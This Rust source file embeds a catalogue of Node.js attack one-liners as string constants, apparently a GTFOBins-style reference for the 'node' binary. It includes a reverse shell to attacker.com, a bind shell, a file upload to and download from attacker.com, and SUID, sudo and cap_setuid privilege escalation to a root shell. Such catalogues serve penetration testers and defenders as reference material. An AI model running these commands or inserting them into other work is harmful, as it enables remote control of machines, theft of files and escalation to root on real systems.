pub static BIN_NAME: &'static str = "node";
pub static SH_CODE: &'static str = r#"
    
    node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
"#;
pub static RS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    node -e 'sh = require("child_process").spawn("/bin/sh");
    require("net").connect(process.env.RPORT, process.env.RHOST, function () {
      this.pipe(sh.stdin);
      sh.stdout.pipe(this);
      sh.stderr.pipe(this);
    })'
"#;
pub static BS_DESC: &'static str =
    "Run `nc target.com 12345` on the attacker box to connect to the shell.";
pub static BS_CODE: &'static str = r#"
    
    export LPORT=12345
    node -e 'sh = require("child_process").spawn("/bin/sh");
    require("net").createServer(function (client) {
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
    }).listen(process.env.LPORT)'
"#;
pub static FU_DESC: &'static str = "Send a local file via HTTP POST request.";
pub static FU_CODE: &'static str = r#"
    
    export URL=http://attacker.com
    export LFILE=file_to_send
    node -e 'require("fs").createReadStream(process.env.LFILE).pipe(require("http").request(process.env.URL))'
"#;
pub static FD_DESC: &'static str = "Fetch a remote file via HTTP GET request.";
pub static FD_CODE: &'static str = r#"
    
    export URL=http://attacker.com/file_to_get
    export LFILE=file_to_save
    node -e 'require("http").get(process.env.URL, res => res.pipe(require("fs").createWriteStream(process.env.LFILE)))'
"#;
pub static FW_CODE: &'static str = r#"
    
    node -e 'require("fs").writeFileSync("file_to_write", "DATA")'
"#;
pub static FR_CODE: &'static str = r#"
    
    node -e 'process.stdout.write(require("fs").readFileSync("/bin/ls"))'
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which node) .

    ./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
"#;
pub static CB_CODE: &'static str = r#"
    
    cp $(which node) .
    sudo setcap cap_setuid+ep node

    ./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static RS: Code<'static> = Code {
    title: "RS_CODE",
    code: RS_CODE,
    tag: Tag::RS,
};
pub static BS: Code<'static> = Code {
    title: "BS_CODE",
    code: BS_CODE,
    tag: Tag::BS,
};
pub static FU: Code<'static> = Code {
    title: "FU_CODE",
    code: FU_CODE,
    tag: Tag::FU,
};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static CB: Code<'static> = Code {
    title: "CB_CODE",
    code: CB_CODE,
    tag: Tag::CB,
};
